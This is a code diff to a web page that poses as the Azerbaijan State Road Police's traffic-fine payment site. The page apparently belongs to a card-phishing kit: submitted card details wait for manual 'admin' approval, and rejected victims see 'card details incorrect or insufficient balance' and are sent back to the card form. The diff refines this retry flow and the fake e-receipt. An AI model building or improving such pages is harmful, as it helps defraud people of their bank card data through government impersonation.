@@ -249,6 +249,11 @@
                 localStorage.setItem('dyp_timer_end', newEndTime);
                 isWaitingForAdmin = false;
                 adviceShown = false;
+                resetFineCardHtml();
+            }
+
+            if (!data.isPaid && !data.isRejected && !data.isPendingApproval && !document.getElementById('val-protocol')) {
+                resetFineCardHtml();
             }
 
             if (data.isPaid || data.isRejected) {
@@ -257,6 +262,7 @@
             }
 
             if (data.isRejected) {
+                document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
                 return;
@@ -275,7 +281,7 @@
                         </div>
                         <div class="space-y-2">
                             <h1 class="text-2xl font-bold text-gray-800">Ödəniş Uğurla Tamamlandı!</h1>
-                            <p class="text-sm text-gray-500">Azərbaycan Respublikası Baş Dövlət Yol Polisi İdarəsi - Elektron Qəbz</p>
+                            <p class="text-sm text-gray-500">Azərbaycan Respublikası Baş Dövlət Yol Polisi İdarəsi - Elektron Qbz</p>
                         </div>
 
                         <div class="bg-gray-50 border border-gray-200 rounded-2xl p-6 text-left space-y-3 shadow-sm">
@@ -469,7 +475,7 @@
             isWaitingForAdmin = false;
             document.getElementById('reject-modal').classList.add('hidden');
 
-            closeModals();
+            resetFineCardHtml();
             openCardModal();
         }
 
